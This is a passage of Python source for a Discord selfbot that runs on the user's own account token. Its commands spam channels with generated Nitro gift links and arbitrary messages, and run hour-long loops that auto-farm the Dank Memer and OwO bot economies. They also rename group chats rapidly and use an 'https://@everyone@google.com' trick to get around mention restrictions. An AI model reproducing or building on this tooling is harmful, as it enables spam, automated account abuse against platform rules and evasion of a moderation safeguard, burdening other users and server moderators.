print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro()) \n            print(Nitro()) \n            print(Nitro())\n\n@client.command()\nasync def nitroo(ctx):\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Nitro Enabled \" + Fore.RESET)\n    await ctx.message.delete()\n    global dmcsz\n    dmcsz = True\n    while dmcsz:\n            await ctx.send(Nitro())\n            time.sleep(1)\n            await ctx.send(Nitro())\n            time.sleep(1)\n            await ctx.send(Nitro())\n            time.sleep(1)\n            await ctx.send(Nitro())\n            time.sleep(1)\n            await ctx.send(Nitro())\n            time.sleep(1)\n            await ctx.send(Nitro())\n            time.sleep(1)\n            await ctx.send(Nitro())\n            time.sleep(1)\n            await ctx.send(Nitro())\n            time.sleep(1)\n            await ctx.send(Nitro())\n            time.sleep(1)\n            await ctx.send(Nitro())\n            time.sleep(1)\n            await ctx.send(Nitro())\n            time.sleep(1)\n            await ctx.send(Nitro())\n            time.sleep(1)\n            await ctx.send(Nitro())\n            time.sleep(1)\n            await ctx.send(Nitro())\n            time.sleep(1)\n            await ctx.send(Nitro())\n            time.sleep(1)\n            await ctx.send(Nitro())\n            time.sleep(1)\n            await ctx.send(Nitro())\n            time.sleep(1)\n            await ctx.send(Nitro())\n            time.sleep(1)\n            await ctx.send(Nitro())\n            time.sleep(1)\n            await ctx.send(Nitro())\n            time.sleep(1)\n            await ctx.send(Nitro())\n            time.sleep(1)\n            await ctx.send(Nitro())\n            time.sleep(1)\n            \n            async for message in ctx.message.channel.history(limit=10).filter(lambda m: m.author == client.user).map(lambda m: m):\n                     try:\n                         await message.delete()\n                     except:\n                          pass\n\n@client.command()\nasync def botfarmer(ctx):\n    await ctx.message.delete()\n    await ctx.send('> ```Botfarmer Comamnds \\n> .dankmemer \\n> .mee6 \\n> .owo```')\n\n@client.command()\nasync def owo(ctx):\n    await ctx.message.delete()\n    await ctx.send('> ```OwO Farmer \\n> .autoOwO \\n> .stopautoOwO```')\n\n@client.command()\nasync def stopautoOwO(ctx):\n    await ctx.message.delete()\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Auto OwO Farmer Disabled \" + Fore.RESET)\n    \n    global dmcsz\n    dmcsz = False\n\n@client.command(pass_context=True)\nasync def autoOwO(ctx):\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Auto OwO Farmer Enabled \" + Fore.RESET)\n    await ctx.message.delete()\n    global dmcsz\n    dmcsz = True\n    while dmcsz:\n        async with ctx.typing():\n            await asyncio.sleep(3)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo flip 600')\n            await asyncio.sleep(2)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(2)\n            await ctx.send('owo flip 800')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo flip 600')\n            await asyncio.sleep(2)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(2)\n            await ctx.send('owo flip 800')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo flip 600')\n            await asyncio.sleep(2)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(2)\n            await ctx.send('owo flip 800')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo flip 600')\n            await asyncio.sleep(2)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(2)\n            await ctx.send('owo flip 800')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo flip 600')\n            await asyncio.sleep(2)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(2)\n            await ctx.send('owo flip 800')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo flip 600')\n            await asyncio.sleep(2)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(2)\n            await ctx.send('owo flip 800')\n            print('break for 30 mins')\n            await asyncio.sleep(1800)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo flip 600')\n            await asyncio.sleep(2)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(2)\n            await ctx.send('owo flip 800')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo flip 600')\n            await asyncio.sleep(2)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(2)\n            await ctx.send('owo flip 800')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo flip 600')\n            await asyncio.sleep(2)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(2)\n            await ctx.send('owo flip 800')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo flip 600')\n            await asyncio.sleep(2)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(2)\n            await ctx.send('owo flip 800')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo flip 600')\n            await asyncio.sleep(2)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(2)\n            await ctx.send('owo flip 800')\n            print('break for 45 mins')\n            await asyncio.sleep(2700)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo flip 600')\n            await asyncio.sleep(2)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(2)\n            await ctx.send('owo flip 800')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo flip 600')\n            await asyncio.sleep(2)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(2)\n            await ctx.send('owo flip 800')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo flip 600')\n            await asyncio.sleep(2)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(2)\n            await ctx.send('owo flip 800')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo flip 600')\n            await asyncio.sleep(2)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(2)\n            await ctx.send('owo flip 800')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo flip 600')\n            await asyncio.sleep(2)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(2)\n            await ctx.send('owo flip 800')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo flip 600')\n            await asyncio.sleep(2)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(2)\n            await ctx.send('owo flip 800')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo flip 600')\n            await asyncio.sleep(2)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(16)\n            await ctx.send('owo h')\n            await asyncio.sleep(2)\n            await ctx.send('owo b')\n            await asyncio.sleep(4)\n            await ctx.send('owo sell all')\n            await asyncio.sleep(2)\n            await ctx.send('owo flip 800')\n            print('break for 1 hour 30 mins')\n            await asyncio.sleep(5400)\n\n@client.command(pass_context=True)\nasync def startfarm(ctx):\n    await ctx.message.delete()\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Dank Memer Farmer Enabled\" + Fore.RESET)\n    global dmcs\n    dmcs = True\n    while dmcs:\n        async with ctx.typing():\n            await asyncio.sleep(5)\n            await ctx.send('pls fish')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n            \n            await ctx.send('pls beg')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n            \n            await asyncio.sleep(45)\n            await ctx.send('pls fish')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n            \n            await ctx.send('pls beg')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n            \n            await asyncio.sleep(45)\n            await ctx.send('pls fish')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n            \n            await ctx.send('pls beg')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n            \n            await asyncio.sleep(45)\n            await ctx.send('pls fish')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n            \n            await ctx.send('pls beg')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n            \n            await asyncio.sleep(45)\n            await ctx.send('pls fish')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n           \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n            \n            await ctx.send('pls beg')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n            \n            await asyncio.sleep(45)\n            await ctx.send('pls fish')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n            \n            await ctx.send('pls beg')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n           \n            await asyncio.sleep(45)\n            await ctx.send('pls fish')\n           \n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n            \n            await ctx.send('pls beg')\n           \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n            \n            await asyncio.sleep(45)\n            await ctx.send('pls fish')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n        \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n            \n            await ctx.send('pls beg')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n           \n            await asyncio.sleep(45)\n            await ctx.send('pls fish')\n           \n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n           \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n           \n            await ctx.send('pls beg')\n           \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n           \n            await asyncio.sleep(45)\n            await ctx.send('pls fish')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n           \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n            \n            await ctx.send('pls beg')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n           \n            await asyncio.sleep(45)\n            await ctx.send('pls fish')\n           \n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n           \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n           \n            await ctx.send('pls beg')\n         \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n        \n            await asyncio.sleep(45)\n            await ctx.send('pls fish')\n          \n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n          \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n            \n            await ctx.send('pls beg')\n           \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n            \n            await asyncio.sleep(45)\n            await ctx.send('pls fish')\n           \n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n          \n            await ctx.send('pls beg')\n          \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n           \n            await asyncio.sleep(45)\n            await ctx.send('pls fish')\n           \n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n           \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n           \n            await ctx.send('pls beg')\n           \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n           \n            await asyncio.sleep(45)\n            await ctx.send('pls fish')\n          \n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n           \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n           \n            await ctx.send('pls beg')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n          \n            await asyncio.sleep(45)\n            await ctx.send('pls fish')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n            \n            await ctx.send('pls beg')\n           \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n           \n            await asyncio.sleep(45)\n            await ctx.send('pls fish')\n           \n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n         \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n          \n            await ctx.send('pls beg')\n         \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n         \n            await asyncio.sleep(45)\n            await ctx.send('pls fish')\n          \n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n         \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n           \n            await ctx.send('pls beg')\n           \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n            \n            await ctx.send('pls beg')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n           \n            await asyncio.sleep(45)\n            await ctx.send('pls fish')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n          \n            await ctx.send('pls beg')\n        \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n         \n            await asyncio.sleep(45)\n            await ctx.send('pls fish')\n         \n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n          \n            await ctx.send('pls beg')\n          \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n          \n            await asyncio.sleep(45)\n            await ctx.send('pls fish')\n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n           \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n          \n            await ctx.send('pls beg')\n          \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n          \n            await asyncio.sleep(45)\n            await ctx.send('pls fish')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n           \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n           \n            await ctx.send('pls beg')\n          \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n         \n            await asyncio.sleep(45)\n            await ctx.send('pls fish')\n           \n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n         \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n           \n            await ctx.send('pls beg')\n         \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n            \n            await asyncio.sleep(45)\n            await ctx.send('pls fish')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n            \n            await ctx.send('pls beg')\n           \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n            \n            await asyncio.sleep(45)\n            await ctx.send('pls fish')\n           \n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n           \n            await ctx.send('pls beg')\n          \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n           \n            await asyncio.sleep(45)\n            await ctx.send('pls fish')\n           \n            await asyncio.sleep(1)\n            await ctx.send('pls dig')\n           \n            await asyncio.sleep(1)\n            await ctx.send('pls hunt')\n            \n            await ctx.send('pls beg')\n            \n            await asyncio.sleep(1)\n            await ctx.send('pls dep all')\n\n            await asyncio.sleep(1)\n            await ctx.send('pls sell fish')\n            \n            await asyncio.sleep(3600)\n\n\n\n\n@client.command()\nasync def stop(ctx):\n\tawait ctx.message.delete()\n\tprint(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Dank Memer Farm Disabled\" + Fore.RESET)\n\tglobal dmcs\n\tdmcs = False\n\n#dank\n\n@client.command()\nasync def dankmemer(ctx):\n    await ctx.message.delete()\n    await ctx.send('> ```Dankmemer \\n> .startfarm / starts the farm \\n> .stop / stops the farm \\n> .info (read this)```')\n\n@client.command()\nasync def mee6(ctx):\n    await ctx.message.delete()\n    await ctx.send('> ```.mee6v1```')\n\n@client.command()\nasync def mee6v1(ctx):\n    await ctx.message.delete()\n    await ctx.send('> ```.startmee6 / spams stuff in chat \\n> .stopmee6 / stops the farm```')   \n\n@client.command(pass_context=True)\nasync def startmee6(ctx):\n    await ctx.message.delete()\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Mee6 Farm Enabled\" + Fore.RESET)\n    global dmcss\n    dmcss = True\n    while dmcss:\n        async with ctx.typing():\n            \n            await ctx.send(\"Spam\")\n\n\n@client.command()\nasync def stopmee6(ctx):\n\tawait ctx.message.delete()\n\tprint(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Mee6 Farm Disabled\" + Fore.RESET)\n\tglobal dmcss\n\tdmcss = False\n            \n@client.command()\nasync def firstmessage(ctx, channel: discord.TextChannel = None):\n    await ctx.message.delete()\n    if channel is None:\n        channel = ctx.channel\n    first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]\n    await ctx.send(f'> First Message \\n> {first_message.jump_url}')\n\n@client.command()\nasync def cat(ctx):\n    await ctx.message.delete()\n    r = requests.get(\"https://api.thecatapi.com/v1/images/search\").json()\n    link = str(r[0][\"url\"])\n    try:\n        async with aiohttp.ClientSession() as session:\n            async with session.get(link) as resp:\n                image = await resp.read()\n        with io.BytesIO(image) as file:\n            await ctx.send(file=discord.File(file, f\"Nax_cat.png\"))\n    except:\n        await ctx.send(link)\n\n\n@client.command()\nasync def sadcat(ctx):\n    await ctx.message.delete()\n    r = requests.get(\"https://api.alexflipnote.dev/sadcat\").json()\n    link = str(r['file'])\n    try:\n        async with aiohttp.ClientSession() as session:\n            async with session.get(link) as resp:\n                image = await resp.read()\n        with io.BytesIO(image) as file:\n            await ctx.send(file=discord.File(file, f\"Nax_sadcat.png\"))\n    except:\n        await ctx.send(link)\n\n\n@client.command()\nasync def bird(ctx):\n    await ctx.message.delete()\n    r = requests.get(\"https://api.alexflipnote.dev/birb\").json()\n    link = str(r['file'])\n    try:\n        async with aiohttp.ClientSession() as session:\n            async with session.get(link) as resp:\n                image = await resp.read()\n        with io.BytesIO(image) as file:\n            await ctx.send(file=discord.File(file, f\"Nax_bird.png\"))\n    except:\n        await ctx.send(link)\n\n\n@client.command()\nasync def fox(ctx):\n    await ctx.message.delete()\n    r = requests.get('https://randomfox.ca/floof/').json()\n    link = str(r[\"image\"])\n    try:\n        async with aiohttp.ClientSession() as session:\n            async with session.get(link) as resp:\n                image = await resp.read()\n        with io.BytesIO(image) as file:\n            await ctx.send(file=discord.File(file, f\"Nax_fox.png\"))\n    except:\n        await ctx.send(link)         \n\n@client.command()\nasync def info(ctx):\n    await ctx.message.delete()\n    await ctx.send('> ```To Farm, you need to do .startfarm and wait a few seconds. then you should get some stuff, after you get some stuff from the thing buy a shovel and a fishing pole. then do it again```')   \n\n#misc\n\n@client.command()\nasync def misc(ctx):\n    await ctx.message.delete()\n    await ctx.send('> ```Misc Commands \\n> .nitro / sends a random nitro link (if your lucky you might get nitro! \\n> .spam (amount, message) / spams messages lol \\n> .everyone / does @ everyone in a secret way \\n> .hypesquad / changes your house (Bravery, Brilliance, balance) \\n> .gcname (name) / changes gc name \\n> .firstmessage / sends first message link```')\n\n@client.command()\nasync def spamgcname(ctx, *, text):\n    await ctx.message.delete()\n    if isinstance(ctx.message.channel, discord.GroupChannel):\n        watermark = f\"{text}\"\n        name = \"\"\n        for letter in watermark:\n            name = name + letter\n            await ctx.message.channel.edit(name=name)\n\n@client.command()\nasync def gcname(ctx, *, name):\n    await ctx.message.delete()\n    await ctx.message.channel.edit(name=name)\n\n\n\n\n\n@client.command(aliases=['changehypesquad'])\nasync def hypesquad(ctx, house): # b'\\xfc'\n    await ctx.message.delete()\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Changed Your Hypesquad To {RESET}{house}\" + Fore.RESET)\n    request = requests.Session()\n    headers = {\n      'Authorization': token,\n      'Content-Type': 'application/json',\n      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'\n    }    \n    if house == \"bravery\":\n      payload = {'house_id': 1}\n    elif house == \"brilliance\":\n      payload = {'house_id': 2}\n    elif house == \"balance\":\n      payload = {'house_id': 3}\n    elif house == \"random\":\n        houses = [1, 2, 3]\n        payload = {'house_id': random.choice(houses)}\n    try:\n        request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)\n    except Exception as e:\n        print(f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Error: {Fore.WHITE}{e}\"+Fore.RESET)\n    \n\n@client.command()\nasync def everyone(ctx): # b'\\xfc'\n    await ctx.message.delete()\n    await ctx.send('https://@everyone@google.com')\n\n@client.command()\nasync def spam(ctx, amount: int, *, message): # b'\\xfc'\n    await ctx.message.delete()    \n    for _i in range(amount):\n        await ctx.send(message)\n\n\n@client.command()\nasync def nitro(ctx): # b'\\xfc'\n    await ctx.message.delete()\n    await ctx.send(Nitro())\n\n\n\n\n\n\n\n    \n\n#TOOLS\n\n@client.command()\nasync def tools(ctx):\n    await ctx.message.delete()\n    await ctx.send('> ``` Tool Commands \\n> .leavegroups / leaves all the groups \\n> .purge (amount) / deletes your text \\n> .read / reads all your messages/notfications \\n> .reverse (text) / reverses your message \\n> .bold (text) / turns your messages bold \\n> .mini (text) / makes your text MINI \\n> .lenny / sends the lenny thing \\n> .shrug / sends the shrug \\n> .tableflip / flips over a table? \\n> .unflip / unflips the table lmfao \\n> .empty / sends a empty message \\n> .encode (text) / encodes a message \\n> .decode (text) / decodes a message \\n> .copy (copys a server) \\n> .discordid / shows your discord id in log \\n> .serverid / shows the server id in log \\n> .clearlog / clears the log \\n> .roleinfo (role) shows role info in log \\n> .memberinfo (user) / shows the users info in log \\n> .backupfriends / puts your friends discord name and tag in text file \\n> .invite / sends server invite \\n> .ignore / ignores all friend requests \\n> .clearblocked / clear blocked people```')\n\n@client.command()\nasync def mini(ctx, *, text=None):\n\tawait ctx.message.delete()\n\tif text is None:\n\t\tawait ctx.send(\"what do you want as a small message???\")\n\telse:\n\t\tminitext = text.replace('a', 'ᴬ').replace('A', 'ᴬ').replace(\n\t\t    'b',\n\t\t    'ᴮ').replace('B', 'ᴮ').replace('c', 'ᶜ').replace('C', 'ᶜ').replace(\n\t\t        'd', 'ᴰ').replace('D', 'ᴰ').replace('e', 'ᴱ').replace(\n\t\t            'E', 'ᴱ').replace('f', 'ᶠ').replace('F', 'ᶠ').replace(\n\t\t                'g', 'ᴳ').replace('G', 'ᴳ').replace('h', 'ᴴ').replace(\n\t\t                    'H',\n\t\t                    'ᴴ').replace('i', 'ᴵ').replace('I', 'ᴵ').replace(\n\t\t                        'j', 'ᴶ').replace('J', 'ᴶ').replace(\n\t\t                            'k', 'ᴷ').replace('K', 'ᴷ').replace(\n\t\t                                'l', 'ᴸ').replace('L', 'ᴸ').replace(\n\t\t                                    'm', 'ᴹ'\n\t\t                                ).replace('M', 'ᴹ').replace(\n\t\t                                    'n', 'ᴺ'\n\t\t                                ).replace('N', 'ᴺ').replace(\n\t\t                                    'o', 'ᴼ'\n\t\t                                ).replace('O', 'ᴼ').replace(\n\t\t                                    'p', 'ᴾ'\n\t\t                                ).replace('P', 'ᴾ').replace(\n\t\t                                    'q', 'ᵠ'\n\t\t                                ).replace('Q', 'ᵠ').replace(\n\t\t                                    'r', 'ᴿ'\n\t\t                                ).replace('R', 'ᴿ').replace(\n\t\t                                    's', 'ˢ'\n\t\t                                ).replace('S', 'ˢ').replace(\n\t\t                                    't', 'ᵀ'\n\t\t                                ).replace('T', 'ᵀ').replace(\n\t\t                                    'u', 'ᵁ'\n\t\t                                ).replace('U', 'ᵁ').replace(\n\t\t                                    'v', 'ⱽ'\n\t\t                                ).replace('V', 'ⱽ').replace(\n\t\t                                    'w', 'ᵂ'\n\t\t                                ).replace('W', 'ᵂ').replace(\n\t\t                                    'x', 'ˣ').replace(\n\t\t                                        'X', 'ˣ').replace(\n\t\t                                            'y', 'ʸ').replace(\n\t\t                                                'Y', 'ʸ').replace(\n\t\t                                                    'z', 'ᶻ').replace(\n\t\t                                                        'Z', 'ᶻ')\n\t\tawait ctx.send(minitext)\n\n@client.command()\nasync def ignore(ctx):\n    await ctx.message.delete()\n    for relationship in client.user.relationships:\n        if relationship is discord.RelationshipType.incoming_request:\n            relationship.delete()\n    \n@client.command()\nasync def clearblocked(ctx):\n    await ctx.message.delete()\n    print(client.user.relationships)\n    for relationship in client.user.relationships:\n        if relationship is discord.RelationshipType.blocked:\n            print(relationship)\n            await relationship.delete()\n\n@client.command(aliases=[\"fancy\"])\nasync def ascii(ctx, *, text):\n    await ctx.message.delete()\n    r = requests.get(\n        f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}'\n    ).text\n    if len('```' + r + '```') > 2000:\n        return\n    await ctx.send(f\"```{r}```\")\n\n@client.command(aliases=['ri', 'role'])\nasync def roleinfo(ctx, *, role: discord.Role): # b'\\xfc'\n    await 